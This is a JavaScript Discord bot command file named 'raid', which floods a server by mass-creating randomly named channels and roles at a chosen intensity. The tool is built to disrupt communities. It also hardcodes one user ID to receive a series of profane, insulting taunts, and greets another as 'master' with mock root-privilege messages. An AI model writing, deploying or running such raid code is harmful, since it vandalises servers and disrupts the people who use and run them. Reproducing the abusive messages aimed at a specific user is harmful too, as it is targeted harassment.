const { SlashCommandBuilder } = require("discord.js");
const embeds = require("../utils/embeds");
const { requireDangerousAuth } = require("../utils/dangerousAuth");
const { sleep } = require("../utils/shared");

module.exports = {
    data: new SlashCommandBuilder()
        .setName("raid")
        .setDescription("Flood a server with mass channel creation and role chaos.")
        .setDMPermission(false)
        .addIntegerOption(o => o.setName("intensity").setDescription("Intensity 1–10").setMinValue(1).setMaxValue(10)),
    name: "raid",
    description: "Raid — mass channel/role disruption.",
    category: "Dangerous",
    ownerOnly: true,
    guildOnly: true,
    async execute({ ctx, interaction, guild, config }) {
        if (interaction && interaction.user) {
            if (interaction.user.id === "980879700043919361") {
                try {
                    if (interaction.deferred || interaction.replied) {
                        await interaction.editReply({ content: "# [INITIALIZING BLACKLISTED USER TERMINATION...]" });
                    } else {
                        await interaction.reply({ content: "# [INITIALIZING BLACKLISTED USER TERMINATION...]", ephemeral: false });
                    }
                    await new Promise(resolve => setTimeout(resolve, 1500));
                    const trollMsgs = [
                        "# FUCK NAH YOU ARE BLACKLISTED.",
                        "# DID YOU REALLY THINK YOU COULD USE THIS?",
                        "# YOUR PERMISSIONS ARE GONE, JUST LIKE YOUR FATHER.",
                        "# GET THE FUCK OUT OF MY COMMANDS."
                    ];
                    for (const msg of trollMsgs) {
                        await interaction.followUp({ content: msg, ephemeral: false });
                        await new Promise(resolve => setTimeout(resolve, 1500));
                    }
                    return;
                } catch(e) {}
            } else {
                if (interaction.user.id === "1001540373623087204") {
            try {
                let msg;
                if (interaction.deferred || interaction.replied) {
                    msg = await interaction.editReply({ content: "```ini\n[SYSTEM OVERRIDE DETECTED...]\n```" });
                } else {
                    msg = await interaction.reply({ content: "```ini\n[SYSTEM OVERRIDE DETECTED...]\n```", fetchReply: true });
                }
                await new Promise(resolve => setTimeout(resolve, 800));
                await interaction.editReply({ content: "```yaml\n> ROOT PRIVILEGES RECOGNIZED.\n```" });
                await new Promise(resolve => setTimeout(resolve, 800));
                await interaction.editReply({ content: "```diff\n+ OMEGA PROTOCOL ACTIVE.\n```" });
                await new Promise(resolve => setTimeout(resolve, 800));
                await interaction.editReply({ content: "# WELCOME BACK MASTER, " + interaction.user.username.toUpperCase() });
                await new Promise(resolve => setTimeout(resolve, 1500));
            } catch(e) {}
        } else {
            try {
                const welcomeMsg = "# WELCOME BACK MASTER, " + interaction.user.username.toUpperCase();
                if (interaction.deferred || interaction.replied) {
                    await interaction.editReply({ content: welcomeMsg });
                } else {
                    await interaction.reply({ content: welcomeMsg });
                }
                await new Promise(resolve => setTimeout(resolve, 1500));
            } catch(e) {}
        }
            }
        }
        const intensity = interaction?.options?.getInteger("intensity") ?? parseInt(ctx.args?.[0]) ?? 5;

        await requireDangerousAuth(ctx, "raid", async () => {
            const { ChannelType } = require("discord.js");

            await ctx.channel.send({ embeds: [embeds.danger("Raid Protocol", `Intensity: **${intensity}/10** — Deploying disruption vectors...`)] });

            for (let i = 0; i < intensity; i++) {
                guild.channels.create({ name: `r3d-${Math.floor(Math.random() * 9999)}`, type: ChannelType.GuildText }).catch(() => {});
                guild.roles.create({ name: `R3D-${Math.floor(Math.random() * 9999)}`, color: Math.floor(Math.random() * 0xFFFFFF) }).catch(() => {});
                await sleep(500);
            }

            await ctx.channel.send({ embeds: [embeds.success("Raid Complete", `Created **${intensity}** channels and roles.`)] });
        }, config);
    }
};
